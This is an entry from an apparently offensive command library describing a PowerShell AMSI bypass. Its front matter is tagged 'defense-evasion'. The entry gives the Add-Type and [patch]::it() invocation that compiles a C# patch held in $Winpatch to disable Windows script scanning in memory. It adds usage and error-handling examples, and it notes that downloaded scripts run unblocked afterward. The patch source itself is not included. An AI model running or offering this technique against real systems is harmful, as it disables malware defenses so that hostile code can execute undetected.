---
type: command
executor: powershell
data: |-
  Add-Type -TypeDefinition $Winpatch -Language CSharp
  [patch]::it()
output: null
created_at: '2023-04-06T03:56:26.126026+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - amsi-bypass
  - powershell
  - defense-evasion
verified: true
validated: true
---

# powershell-patch-amsi-reflection

## Command

```powershell
Add-Type -TypeDefinition $Winpatch -Language CSharp
[patch]::it()
```

## Description

This command compiles a predefined C# assembly (stored in $Winpatch) and invokes its patching method to disable AMSI scanning via memory modification. Use this after defining the $Winpatch variable in a PowerShell session to evade runtime script scanning.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$Winpatch` | Here-string containing the C# code for the AMSI patch assembly | Yes (pre-defined) |
| `-TypeDefinition` | Specifies the C# source code to compile into a .NET type | Yes |
| `-Language` | Specifies CSharp as the compilation language | Yes |
| `[patch]::it()` | Static method invocation to apply the architecture-specific patch | Yes |

## Examples

### Basic Usage

Assuming $Winpatch is defined:

```powershell
Add-Type -TypeDefinition $Winpatch -Language CSharp
[patch]::it()
```

### With Error Handling

```powershell
try {
    Add-Type -TypeDefinition $Winpatch -Language CSharp
    [patch]::it()
} catch {
    Write-Output "Patch failed: $_"
}
```

## Expected Output

On success: "Patch Successful" printed to the console. No output if failed, or exception details. Subsequent AMSI-protected commands (e.g., IEX downloads) execute without blocking.

## Related

- [[procedures/Reflection-Based-AMSI-Bypass-with-WMF5-Autologging]]
- [[codes/C-Sharp-AMSI-Patch-Via-Reflection]]
